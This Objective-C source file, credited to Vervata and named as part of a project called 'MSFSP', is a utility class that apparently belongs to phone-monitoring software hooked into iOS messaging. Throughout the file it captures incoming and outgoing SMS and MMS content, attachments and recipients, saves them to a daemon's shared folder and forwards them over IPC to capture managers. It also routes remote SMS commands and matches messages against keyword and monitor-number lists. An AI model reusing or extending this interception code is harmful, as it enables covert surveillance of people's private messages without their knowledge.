
/**
 - Project name :  MSFSP
 - Class name   :  SMSUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "SMSUtils.h"
#import "DefStd.h"
#import "MessagePortIPCSender.h"
#import "NSString+ScanString.h"
#import "CTMessagePart.h"
#import "CTMessage.h"
#import "DaemonPrivateHome.h"
#import "SharedFileIPC.h"
#import "PrefKeyword.h"
#import "PrefMonitorNumber.h"

#define MAX_MONITOR_NUMBER_CHECK_LENGTH 6


@interface SMSUtils (private) 
- (BOOL) isValidEmail: (NSString *) checkString;
@end


@implementation SMSUtils

/**
 - Method name: writeMMSItems:recipients:subject:andSMSType
 - Purpose:  This method is used for write MMS items into the Message port
 - Argument list and description: aItems (NSArray),subject (NSString),andSMSType (NSString)
 - Return type and description: No Return
 */

- (void) writeMMSItems: (NSArray *) aItems 
			recipients: (NSArray *) aRecipients 
			   subject: (NSString *) aSubject
			 messageID: (unsigned int) aMessageID 
			   smsType: (NSString *) aMMSType 
			   smsInfo: (NSDictionary *) aMMSInfo {
	//DLog (@"Message Items = %@", aItems)
	
	NSMutableArray *mmsAttachments = [[NSMutableArray alloc] init];
	NSString *mmsSubject = aSubject;
	NSString *mmsMessage = @"";
	
	//=================================================================================		
	
	if ([aMMSType isEqualToString:kMMSOutgoing]) {	
		//=====================MMS OutGoing items============================================================================================	
		for(NSDictionary *item in aItems ) {
			DLog (@"Outgoing item inside message items = %@", item)
			NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init];
			if([item objectForKey:kMessageAttachmentFilePath]) // Store Attachment path
				[dictItem setValue:[item objectForKey:kMessageAttachmentFilePath] forKey:kMMSAttachmenInfoKey];
			else
				[dictItem setValue:[item objectForKey:kMessageDataKey] forKey:kMMSAttachmenInfoKey]; // store Attachment Data
			
			[dictItem setValue:[item objectForKey:kMessageFileNameKey] forKey:kMMSFileNameKey];

			[mmsAttachments addObject:dictItem];
			[dictItem release];
			//====================================================================================================================================
			// if mms subject is empty then put the  subject as mms text body
			if([[item objectForKey:kMessageContentTypeKey] isEqualToString:kMessageTextContentType]) {
				NSString *mmsText = [[NSString alloc] initWithData:[item objectForKey:kMessageDataKey]
														  encoding:NSUTF8StringEncoding];
//				if(![mmsSubject length]) {					
//					mmsSubject=[NSString stringWithFormat:@"%@%@", mmsSubject, mmsText];								
//				}
				DLog (@"outgoing mmsSubject %@", mmsSubject)
				// Manipulate the message body
				//mmsMessage = [mmsMessage stringByAppendingFormat:@"%@\n\n", mmsText];
				[mmsText release];
			}	
			//======================================================================================================================================
		} //End of for loop
		if (![mmsAttachments count]) { // if aItems does not support subject parameter.Copy the subject line in to attachment data
			NSData *attachment = [mmsSubject dataUsingEncoding:NSUTF8StringEncoding];
			NSString *defaultFileName = [NSString stringWithFormat:@"default_mmsatt_%lf.txt",[[NSDate date] timeIntervalSince1970]];
			NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init]; 
			[dictItem setValue:attachment forKey:kMMSAttachmenInfoKey];
			[dictItem setValue:defaultFileName forKey:kMMSFileNameKey];
			[mmsAttachments addObject:dictItem];
			[dictItem release];
		}
	} //End of if condition
	
	
	else {
		//=====================MMS Incoming items==================================================================================================	
		for(CTMessagePart* msgPart in aItems) {
			//DLog (@"Incoming message part inside message items = %@", item)
			if(![[msgPart contentType] isEqualToString:kMessageSMILContentType]) { 
				//audio,video,image,text
				NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init];
				[dictItem setObject:[msgPart data] forKey:kMMSAttachmenInfoKey];
				[dictItem setValue:[msgPart contentLocation] forKey:kMMSFileNameKey];
				[mmsAttachments addObject:dictItem];
				[dictItem release];
			}
			//===========================================================================================================================================
			// if mms subject is empty then put the subject as  mms text body
			if([[msgPart contentType] isEqualToString:kMessageTextContentType]) {
				NSString *mmsText = [[NSString alloc] initWithData:[msgPart data]
														  encoding:NSUTF8StringEncoding];
//				if(![mmsSubject length]) {					
//					mmsSubject = [NSString stringWithFormat:@"%@%@",mmsSubject,mmsText];					
//				}
				DLog (@"incoming mmsSubject %@", mmsSubject)
				// Manipulate the message body
				//mmsMessage = [mmsMessage stringByAppendingFormat:@"%@\n\n", mmsText];
				[mmsText release];
			}	
			//============================================================================================================================================
		} //End of for loop
	} // End of if else condition
	//==================== Create MMS Info =======================================
	NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
	NSMutableData* data = [[NSMutableData alloc] init];
	[dictionary setObject:mmsAttachments forKey:kMMSAttachments];
	[dictionary setValue:mmsSubject forKey:kMessageSubjectKey];
	[dictionary setValue:aRecipients forKey:kMMSRecipients];
	[dictionary setValue:aMMSType forKey:kMMSTypeKey];
	[dictionary setValue:kMessageTypeMMS forKey:kMessageTypeKey];
	[dictionary setValue:mmsMessage forKey:kMMSTextKey];
	[dictionary setValue:[aMMSInfo objectForKey:kMMSInfoDateStringKey] forKey:kMMSDateStringKey];	
	[dictionary setValue:[aMMSInfo objectForKey:kMMSInfoGroupIDKey] forKey:kMMSGroupIDKey];		
	
	DLog (@"date >> %@", [dictionary objectForKey:kMMSDateStringKey])
	DLog (@"group >> %@", [dictionary objectForKey:kMMSGroupIDKey])
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:dictionary forKey:kMessageMonitorKey];
	[archiver finishEncoding];
	
	NSString *filePath = [self messagePath:aMessageID];
	[data writeToFile:filePath atomically:YES];
	DLog (@"======>Saved Path for MMS:%@",filePath);
	// Send MMS Message directly if message type is incoming,otherwsie keep the message in file ( send only when the messagse is successfully delivered)
	if([aMMSType isEqualToString:kMMSIncomming]) {
		BOOL successfully = [self sendMessageInfo:[filePath dataUsingEncoding:NSUTF8StringEncoding]
								   andMessagePort:kMMSMessagePort];
		if (!successfully) {
			NSFileManager *fileManager = [NSFileManager defaultManager];
			[fileManager removeItemAtPath:filePath error:nil];
		}
	}
	[archiver release];
	[dictionary release];
	[data release];
	[mmsAttachments release];
}

/**
 - Method name: writeSMSWithSenderNumber:message:isSMSCommand:andSMSType
 - Purpose:  This method is used for write SMS items into the Message port
 - Argument list and description: aSenderNumber (NSString),message (NSString),isSMSCommand (BOOL),aSMSType (NSString)
 - Return type and description: No Return
 */

//- (void) writeSMSWithRecipient: (NSArray *) aRecipients
//					   message: (NSString *) aMessage
//				  isSMSCommand: (BOOL) aIsSMSCommand
//	                 messageID: (unsigned int) aMessageID 
//				    andSMSType: (NSString *) aSMSType {
- (void) writeSMSWithRecipient: (NSArray *) aRecipients
					   message: (NSString *) aMessage
				  isSMSCommand: (BOOL) aIsSMSCommand
					 messageID: (unsigned int) aMessageID 
					   smsType: (NSString *) aSMSType 
					   smsInfo: (NSDictionary *) aSMSInfo {
	
	//==================== Create SMS Info ===============================================================================
	NSMutableDictionary *dictionary = [[NSMutableDictionary alloc]init];
	NSMutableData* data = [[NSMutableData alloc] init];
	[dictionary setValue:aMessage forKey:kSMSTextKey];
	[dictionary setValue:@"" forKey:kMessageSubjectKey]; // Protocol not contain subject
	[dictionary setValue:aRecipients forKey:kMessageSenderKey];
    [dictionary setValue:aSMSType forKey:kSMSTypeKey];
    [dictionary setValue:kMessageTypeSMS forKey:kMessageTypeKey];
	[dictionary setValue:[aSMSInfo objectForKey:kSMSInfoGroupIDKey] forKey:kSMSGroupIDKey];
	DLog (@"converstaion id %@", [aSMSInfo objectForKey:kSMSInfoGroupIDKey])
	
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:dictionary forKey:kMessageMonitorKey];
	[archiver finishEncoding];
    //Send SMS Message directly if message type is incoming,otherwsie keep the message in file ( send only when the messagse is successfully delivered)
	if(!aIsSMSCommand) {
		NSString *filePath = [self messagePath:aMessageID];
		[data writeToFile:filePath atomically:YES];
		DLog (@"=====>Saved Path For SMS:%@",filePath);
	    if([aSMSType isEqualToString:kSMSIncomming]) {
			BOOL successfully = [self sendMessageInfo:[filePath dataUsingEncoding:NSUTF8StringEncoding]
									   andMessagePort:kSMSMessagePort]; // Send incoming sms message directly to the port
			if (!successfully) {
				NSFileManager *fileManager = [NSFileManager defaultManager];
				[fileManager removeItemAtPath:filePath error:nil];
			}
		}
    }
	else {
		[self sendMessageInfo:data
	           andMessagePort:kSMSCommandPort]; // send sms command directly to the sms command port
	}
	[archiver release];
	[dictionary release];
	[data release];
}


/**
 - Method name: sendMessageInfo:andMessagePort
 - Purpose:  This method is used for sending outgoing sms/ms to the application component
 - Argument list and description: aMessageData (NSData *) data to send, aMessagePort (NSString *) port name
 - Return type and description: Boolean true is succes otherwise false
 */

- (BOOL) sendMessageInfo: (NSData *) aMessageData  
		  andMessagePort: (NSString *) aMessagePort {
	DLog (@"======>Sending Message.....")
	MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aMessagePort];
	BOOL successfully = [messagePortSender writeDataToPort:aMessageData];
	[messagePortSender release];
	return (successfully);
}


/**
 - Method name: deliveredOutGoingMessage
 - Purpose:  This method is used for sending outgoing sms/ms to the application component
 - Argument list and description: aMessageID (unsigned int)
 - Return type and description: No Return
 */

- (void) deliveredOutGoingMessage: (unsigned int) aMessageID {
	NSString *outgoingMessagePath = [self messagePath:aMessageID];
	DLog (@"======>Outgoing Message Path:%@", outgoingMessagePath);
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:[NSData dataWithContentsOfFile:outgoingMessagePath]];
	NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kMessageMonitorKey] retain];
	DLog(@"=======>Messsage Type:%@",[dictionary objectForKey:kMessageTypeKey]);
	
	if ([[dictionary objectForKey:kMessageTypeKey] isEqualToString:kMessageTypeSMS]) {
		
		BOOL successfully = [self sendMessageInfo:[outgoingMessagePath dataUsingEncoding:NSUTF8StringEncoding]
								   andMessagePort:kSMSMessagePort];
		if (!successfully) {
			NSFileManager *fileManager = [NSFileManager defaultManager];
			[fileManager removeItemAtPath:outgoingMessagePath error:nil];
		} else {
			DLog (@"======>Delivered Outgoing SMS Successfully to the SMSCaptureManager");
		}
		
	} else if ([[dictionary objectForKey:kMessageTypeKey] isEqualToString:kMessageTypeMMS]) {
		
	    BOOL successfully = [self sendMessageInfo:[outgoingMessagePath dataUsingEncoding:NSUTF8StringEncoding]
								   andMessagePort:kMMSMessagePort];
		if (!successfully) {
			NSFileManager *fileManager = [NSFileManager defaultManager];
			[fileManager removeItemAtPath:outgoingMessagePath error:nil];
		} else {
			DLog (@"======>Delivered Outgoing MMS Successfully to the MMSCaptureManager");
		}
	} else {
		DLog (@"Invalid message type")
	}

	[unarchiver release];
	[dictionary release];
}

/**
 - Method name: removeUnSentMessage
 - Purpose:  This method is used to Unsent sms/mms from the saved path
 - Argument list and description: aMessageID (unsigned int)
 - Return type and description: No Return
 */

- (void) removeUnSentMessage: (unsigned int) aMessageID {
	NSError *error;
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSString *unsentMailPath = [self messagePath:aMessageID];
	if([fileManager removeItemAtPath:unsentMailPath error:&error]) {
		DLog (@"======>Removed unsent message from the file sucessfully")
	} else {
		DLog (@"====>Error occured while removing message")
	}
}

/**
 - Method name: messagePath
 - Purpose:  This method is used to get path for saving message
 - Argument list and description: aMessageID (unsigned int)
 - Return type and description: No Return
 */

- (NSString *) messagePath: (unsigned int) aMessageID {
	return [NSString stringWithFormat:@"%@smsmms_%u.dat",[DaemonPrivateHome daemonSharedHome],aMessageID];
}

/**
 - Method name: smsMessageWithParts
 - Purpose:  This method is used for retrieving SMS Text
 - Argument list and description: aItems (NSArray)
 - Return type and description: No Return
 */

- (NSString *) smsMessageWithParts: (id) aParts {
	id msgPart = nil;
	NSData *smsData = nil;
	id smsText = nil;
	if([aParts isKindOfClass:[NSDictionary class]]) {
		NSArray *messageItems = [aParts objectForKey:kMessageInfoKey];
		if([messageItems count]>0) { //Outgoing SMS Text without Subjectline 
			smsData = [[messageItems objectAtIndex:0] objectForKey:kMessageDataKey];
			smsText = [[NSString alloc] initWithData:smsData encoding:NSUTF8StringEncoding];
		}
		else { //Outgoing SMS Text with Subjectline 
			smsText = (NSString *) [[aParts objectForKey:kMessageTextBodyKey] retain];
		}
	}
	else {
		msgPart = [aParts objectAtIndex:0]; //Incoming SMS Text
		smsData = [msgPart data]; 
		smsText = [[NSString alloc] initWithData:smsData encoding:NSUTF8StringEncoding];
	}
	return [smsText autorelease];
}

/**
 - Method name: isMMSWithMessageInfo:recipientInfo:
 - Purpose:  This method is used for checking MMS avilability
 - Argument list and description: aMessageInfo (NSArray),aRecipientInfo(NSArray)
 - Return type and description: BOOL
 */

- (BOOL) isMMSWithMessageInfo: (NSArray*) aMessageInfo 
				recipientInfo: (NSArray*) aRecipientInfo {
	BOOL isMMS = NO;
	
	DLog (@"step 1: Checking Attachment......")
	for(NSDictionary *item in aMessageInfo ) {
		if(![[item objectForKey:kMessageContentTypeKey] isEqualToString:kMessageTextContentType]) {
			isMMS=YES;
			break;
		}
	}
	
	if(!isMMS) {
		DLog (@"step 2: Checking Recipient......")
		for(NSString *senderNumber in aRecipientInfo) {
			DLog (@"senderNumber: %@" ,senderNumber)
			if ([self isValidEmail:senderNumber]) {
				isMMS=YES;
				break;
			}				
		}
	}
	return isMMS;
}

/**
 - Method name: contactInfo
 - Purpose:This method is used to get contact information
 - Argument list and description:aContactInfo (id)
 - Return description:recipients (NSArray)
 */

- (NSArray *) contactInfo: (id) aContactInfo  {
    NSMutableArray *smsAddressArray = [[NSMutableArray alloc] init];
	if([aContactInfo isKindOfClass:[NSDictionary class]]) {
		if ([aContactInfo objectForKey:kMessageRecipientKey]) {
			[smsAddressArray release];
			smsAddressArray = nil;
	    	smsAddressArray=[[aContactInfo objectForKey:kMessageRecipientKey]copy];
			DLog (@"Contact Address:%@",smsAddressArray);
		}
     	else {
	    	[smsAddressArray addObject:[aContactInfo objectForKey:kMessageSenderKey]];
			DLog (@"Contact Address:%@",[aContactInfo objectForKey:kMessageSenderKey]);
		}
    }
    else {
	    [smsAddressArray addObject:aContactInfo];
		DLog (@"Contact Address:%@",aContactInfo);
    }
	return [smsAddressArray autorelease];
}

/**
 - Method name: subjectLineWithMessageInfo
 - Purpose:This method is used to get the subjectline from the message dictionary
 - Argument list and description:aMessageInfo (NSDictionary)
 - Return description:subject (NSString)
 */

- (NSString *) subjectLineWithMessageInfo: (NSDictionary *) aMessageInfo {
	NSString *subject = @"";
    if([aMessageInfo objectForKey:kMessageSubjectKey])
		subject = [aMessageInfo objectForKey:kMessageSubjectKey];
	else
		subject = [aMessageInfo objectForKey:kMessageTextBodyKey];
	DLog (@"====>Subject:%@",subject);
	return subject;
}

/**
 - Method name: isPhoneNumber
 - Purpose:This method is used to check PHONE NUMBER
 - Argument list and description:aCmdString (NSString)
 - Return description:YES/NO
 */

- (BOOL) isPhoneNumber: (NSString *) aSenderNumber {
	BOOL isPhNum = NO;
	if (aSenderNumber) {
    	NSRange nonDigits = [aSenderNumber rangeOfCharacterFromSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]];
	    NSRange plusCharRange=[aSenderNumber rangeOfString:@"+"];
		DLog (@"nonDigits(location/length): (%d, %d)", nonDigits.location, nonDigits.length)
		DLog (@"NSEqualRanges(NSMakeRange(NSNotFound, 0), nonDigits) %d", NSEqualRanges(NSMakeRange(NSNotFound, 0), nonDigits))
	    //if ( NSNotFound == nonDigits.location || (plusCharRange.location == 0 && aSenderNumber.length > 1))   {		
		if (NSEqualRanges(NSMakeRange(NSNotFound, 0), nonDigits) || (plusCharRange.location == 0 && aSenderNumber.length > 1))   {
			isPhNum = YES;
		} 
	}
 	return isPhNum;
}

/**
 - Method name:			isValidEmail
 - Purpose:				This method is used to check whether a checkString is valid email address
 - Argument list and description:	checkString (NSString)
 - Return description:	YES/NO
 */
- (BOOL) isValidEmail: (NSString *) checkString {
	BOOL stricterFilter = YES;
	NSString *stricterFilterString	= @"[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}"; 				
	NSString *laxString				= @".+@.+\\.[A-Za-z]{2}[A-Za-z]*";
	NSString *emailRegex			= stricterFilter ? stricterFilterString : laxString;
	NSPredicate *emailTest			= [NSPredicate predicateWithFormat:@"SELF MATCHES %@", emailRegex];
	return [emailTest evaluateWithObject:checkString];
}

/**
 - Method name: checkSMSKeywordWithMonitorNumber:
 - Purpose:  This method is used to check SMS keywords as well as monitor numbers
 - Argument list and description: aSMSText(NSString *)
 - Return type and description: BOOL
 */

+ (BOOL) checkSMSKeywordWithMonitorNumber: (NSString *) aSMSText {
	DLog(@"SMS=====>checkSMSKeywordWithMonitorNumber ===>start checking")
	BOOL found = FALSE;
	SharedFileIPC *sFileIPC4 = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	
	NSData *monitorNumberData = [sFileIPC4 readDataWithID:kSharedFileMonitorNumberID];
	NSData *keywordData = [sFileIPC readDataWithID:kSharedFileKeywordID];
	
	if (monitorNumberData) {
		PrefMonitorNumber *prefMonitorNumber = [[PrefMonitorNumber alloc] initFromData:monitorNumberData];
		// 1. Keywords
		if ([prefMonitorNumber mEnableMonitor] && keywordData) {
			PrefKeyword *prefKeyword = [[PrefKeyword alloc] initFromData:keywordData];
			for (NSString *keyword in [prefKeyword mKeywords]) {
				DLog(@"keyword = %@", keyword)
				if ([aSMSText scanWithKeyword:keyword]) {
					found = TRUE;
					break;
				}
			}
			[prefKeyword release];
			prefKeyword = nil;
		}
		
		// 2. Monitor numbers
		if (!found && [prefMonitorNumber mEnableMonitor]) {
			for (NSString *monitorNumber in [prefMonitorNumber mMonitorNumbers]) {
				NSString *number = ([monitorNumber length] > MAX_MONITOR_NUMBER_CHECK_LENGTH) ?
				[monitorNumber substringWithRange:NSMakeRange([monitorNumber length] - MAX_MONITOR_NUMBER_CHECK_LENGTH, MAX_MONITOR_NUMBER_CHECK_LENGTH)] : monitorNumber;
				DLog(@"monitorNumber = %@, number = %@", monitorNumber, number)
				if ([aSMSText scanWithMonitorNumber:number]) {
					found = TRUE;
					break;
				}
			}
		}
		[prefMonitorNumber release];
		prefMonitorNumber = nil;
	}
	DLog(@"SMS=====>checkSMSKeywordWithMonitorNumber ===>Finish checking")
	[sFileIPC release];
	sFileIPC = nil;
	[sFileIPC4 release];
	sFileIPC4 = nil;
	return (found);
}

/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
 */

- (void) dealloc {
	[super dealloc];	
}

@end
